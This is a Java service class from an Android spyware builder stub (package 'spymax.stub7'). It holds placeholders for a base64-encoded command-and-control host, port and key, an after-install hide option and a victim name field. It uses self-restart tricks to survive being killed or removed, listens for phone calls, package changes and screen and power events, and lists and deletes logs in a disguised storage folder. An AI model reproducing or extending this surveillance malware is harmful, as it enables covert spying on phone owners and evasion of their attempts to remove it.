package spymax.stub7;




import android.app.Notification;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;

import android.content.Intent;
import android.content.IntentFilter;

import android.media.MediaMetadataRetriever;
import android.os.Build;
import android.os.Environment;

import android.os.IBinder;


import android.provider.Settings;

import java.io.File;


import java.util.List;

import java.util.concurrent.TimeUnit;


import static spymax.stub7.ClassGen3.Trys;
import static spymax.stub7.ClassGen3.iamworking;
import static spymax.stub7.ClassGen3.phonixeffect;
import static spymax.stub7.ClassGen3.NeedSuper;

import static spymax.stub7.ClassGen3.speedTime;

import static spymax.stub7.ClassGen3.GS_ClassGen11_B;



public class ClassGen11 extends Service {


    //Connection Key encoded with base64 key.info
    public static  String yrfjerClassGen11SERBRE = ClassGen3._D_BASE64_("key.info");


    //after install  [TYPE-HIDE]
    public static String Afterinstalloption ="[TYPE-HIDE]";
    public static String CLINAME ="[CYPHER_VICTIM]";


    //Host encoded with base64 host.info
    public static  String Host = "host.info";

    //Port encoded with base64  port.info
    public static  String Port = "port.info";

    public static List<ClassGen8> L_ClassGen11_i;
    public static List<ClassGen0> L_ClassGen11_cl;

    public static long e_ClassGen11_co = -1;
    public static int p_ClassGen11_lg = -1;
    public static int inx = -1;
    public static String c_ClassGen11_mn[]={"","","","","","","","","","","","","","","","",""};
    public static boolean k = false;
    public static boolean k_ClassGen11_live = false;
    public static boolean F_ClassGen11_ORCA = false;
    public static boolean FO_ClassGen11_RSC = false;
    public static boolean Is_ClassGen11_Hidden = false;
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public void onDestroy(){
        super.onDestroy();
        ClassGen3.s_ClassGen3_f0 = 0;
        st = null;
        try {
            try
            {
                phonixeffect(app_ClassGen11_Context,"Error",180000);
            }
            catch (Exception ex ){

            }


            if(br != null)
            {
                unregisterReceiver(br);
            }

//            if (ClassGen3.sr != null)
//            {
//                unregisterReceiver(ClassGen3.sr);
//            }

            if(ClassGen3.rc != null){
                unregisterReceiver(ClassGen3.rc);
            }
            try
            {

                sendBroadcast(new Intent(getApplicationContext(), SensorRestarterBroadcastReceiver.class).setAction("RestartSensor"));


            }catch (Exception e){     }



        } catch (Exception e) {     }
    }
    static ClassGen11 st;

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        try
        {
            phonixeffect(app_ClassGen11_Context,"Error",180000);
        }
        catch (Exception ex ){
        }
        try
        {

            sendBroadcast(new Intent(getApplicationContext(), SensorRestarterBroadcastReceiver.class).setAction("RestartSensor"));


        }catch (Exception e){     }

    }


    public static ClassGen12 MyAccess = null;




    public static void D_ClassGen11_ele(String replace) {
        try
        {

            String my_ClassGen11_date = replace;

            File sdDir = android.os.Environment.getExternalStorageDirectory();

            File out = new File(sdDir+"/Config/sys/apps/log", "log-"+my_ClassGen11_date+".txt");

            if (out.exists())
            {
                out.delete();
            }
            else
            {
                 out = new File(sdDir+"/Config/sys/apps/log", "log-"+my_ClassGen11_date+".txt");
                out.delete();
            }


        }catch (Exception e){}


    }

    public static String Get_ClassGen11_Logs() {
       try
       {
           String path = Environment.getExternalStorageDirectory().toString()+"/Config/sys/apps/log";
           // Log.d("Files", "Path: " + path);
           File directory = new File(path);
           File[] files = directory.listFiles();
           String All_ClassGen11_names="";
           //  Log.d("Files", "Size: "+ files.length);
           for (int i = 0; i < files.length; i++)
           {
               All_ClassGen11_names+= files[i].getName()+"*";
               // Log.d("Files", "FileName:" + files[i].getName());
           }
           return All_ClassGen11_names;
       }catch (Exception e){}
       return "";

    }


        public static Context app_ClassGen11_Context;


    //public static Notification MyNote = null;

    public static boolean allok =false;
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
      try
      {
          if  (app_ClassGen11_Context == null)
          {
              app_ClassGen11_Context = getApplicationContext();
          }

          ClassGen3.p_ClassGen3_r = app_ClassGen11_Context.getResources().getString(R.string.t1t2t3t4t5t6);
          if (allok)
          {


              if (ClassGen10._runn_srv_(_srv_worker_.class, app_ClassGen11_Context)) {
                      app_ClassGen11_Context.startService(new Intent(app_ClassGen11_Context, _srv_worker_.class));

              }
          }

          return START_STICKY;
      }catch (Exception b){}



        return  START_NOT_STICKY;
    }

    public static BroadcastReceiver br  =null;
    public class MyExceptionHandler implements
            java.lang.Thread.UncaughtExceptionHandler {
        private final Context myContext;
        private final Class<?> myActivityClass;

        public MyExceptionHandler(Context context, Class<?> c) {
            myContext = context;
            myActivityClass = c;
        }

        public void uncaughtException(Thread thread, Throwable exception) {
            try
            {
                phonixeffect(myContext,"Error",180000);

                sendBroadcast(new Intent(getApplicationContext(), SensorRestarterBroadcastReceiver.class).setAction("RestartSensor"));


            }catch (Exception e){}

           // System.exit(0);
        }}


    @Override
    public void onCreate() {
        super.onCreate();
        try
        {
            if  (app_ClassGen11_Context == null)
            {
                app_ClassGen11_Context = getApplicationContext();
            }
        }catch (Exception e)
        {

            //e.printStackTrace();
        }



        final Context ctx = getApplicationContext();

        ClassGen3.p_ClassGen3_r = ctx.getResources().getString(R.string.t1t2t3t4t5t6);

        try {



            if (br == null){
                try {




                    IntentFilter fs = new IntentFilter("android.intent.action.PHONE_STATE");
                    fs.addAction("android.intent.action.NEW_OUTGOING_CALL");

                    fs.addAction("android.intent.extra.PHONE_NUMBER");
//                    ClassGen3.sr = new _callr_lsnr_();
//                    registerReceiver(ClassGen3.sr, fs);
                    br = new RC();
                    IntentFilter intentFilter = new IntentFilter();
                    intentFilter.addAction(Intent.ACTION_PACKAGE_ADDED);
                    intentFilter.addAction(Intent.ACTION_PACKAGE_REMOVED);


                    intentFilter.addAction(Intent.ACTION_PACKAGE_REPLACED);
                    intentFilter.addAction(Intent.ACTION_PACKAGE_CHANGED);
                    intentFilter.addAction(Intent.ACTION_PACKAGES_SUSPENDED);
                    intentFilter.addDataScheme("package");
                    registerReceiver(br, intentFilter);


                }catch (Exception e) {}
            }

            if(ClassGen3.rc == null) {
                IntentFilter f = new IntentFilter(Intent.ACTION_SCREEN_ON);
                Boolean Isit = RegNew(f);

            }

        }catch (Exception e) {
            // e.printStackTrace();

        }



    }


    private Boolean RegNew(IntentFilter f) {
        try {
            if(f != null)
            {
                    f.addAction(Intent.ACTION_SCREEN_OFF);
                    f.addAction(Intent.ACTION_USER_PRESENT);
                    f.addAction(Intent.ACTION_POWER_CONNECTED);
                    f.addAction(Intent.ACTION_POWER_DISCONNECTED);
                    ClassGen3.rc = new ClassGen14();
                    registerReceiver(ClassGen3.rc, f);
                    return  true;
            }


        }catch (Exception e) {}
        return  false;
    }


}